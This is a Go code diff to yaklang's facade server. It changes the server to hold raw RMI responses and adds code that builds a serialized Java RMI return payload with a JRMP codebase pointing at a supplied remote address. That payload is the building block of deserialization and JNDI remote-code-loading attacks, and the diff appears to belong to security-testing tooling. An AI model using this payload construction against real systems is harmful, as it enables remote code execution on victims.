@@ -1,6 +1,7 @@
 package facades
 
 import (
+	"bytes"
 	"context"
 	"fmt"
 	"github.com/lor00x/goldap/message"
@@ -8,6 +9,8 @@ import (
 	"github.com/yaklang/yaklang/common/log"
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/utils/tlsutils"
+	"github.com/yaklang/yaklang/common/yserx"
+	"github.com/yaklang/yaklang/common/yso"
 	"net"
 	"sync"
 
@@ -23,7 +26,7 @@ type FacadeServer struct {
 	//反连地址
 	ReverseAddr string
 
-	rmiResourceAddrs           map[string]string
+	rmiResourceAddrs           map[string][]byte
 	ldapResourceAddrs          map[string]map[string]any
 	httpResource               map[string]*HttpResource
 	handlers                   []func(notification *Notification)
@@ -83,9 +86,29 @@ func (f *FacadeServer) Config(configs ...FacadeServerConfig) {
 		config(f)
 	}
 }
+func SetRmiResource(name string, resource []byte) FacadeServerConfig {
+	return func(f *FacadeServer) {
+		f.rmiResourceAddrs[name] = resource
+	}
+}
 func SetRmiResourceAddr(name string, rmiResourceAddr string) FacadeServerConfig {
 	return func(f *FacadeServer) {
-		f.rmiResourceAddrs[name] = rmiResourceAddr
+		objIns, err := yso.GetJavaObjectArrayIns()
+		if err != nil {
+			log.Error(err)
+		}
+		payload, err := yso.ToBytes(objIns, yso.SetToBytesJRMPMarshalerWithCodeBase(rmiResourceAddr))
+		payloadBuf := bytes.Buffer{}
+		payloadBuf.WriteByte(0x51)                       // Return
+		payloadBuf.Write([]byte{0xac, 0xed, 0x00, 0x05}) // stream header
+		payloadBuf.Write([]byte{0x77, 0x0f})             // TC_BLOCKDATA Header,length: 0x0f
+		payloadBuf.WriteByte(0x01)                       //NormalReturn
+		payloadBuf.Write(yserx.IntTo4Bytes(0))           // unique
+		payloadBuf.Write(yserx.Uint64To8Bytes(0))        //time
+		payloadBuf.Write(yserx.IntTo2Bytes(0))           //count
+		payloadBuf.Write(payload[4:])
+		rmiPayload := payloadBuf.Bytes()
+		f.rmiResourceAddrs[name] = rmiPayload
 	}
 }
 
@@ -150,7 +173,7 @@ func NewFacadeServer(host string, port int, configs ...FacadeServerConfig) *Faca
 		Port:              port,
 		ldapEntry:         make(map[string]interface{}),
 		httpResource:      make(map[string]*HttpResource),
-		rmiResourceAddrs:  make(map[string]string),
+		rmiResourceAddrs:  make(map[string][]byte),
 		ldapResourceAddrs: make(map[string]map[string]any),
 		httpMux:           &sync.Mutex{},
 	}
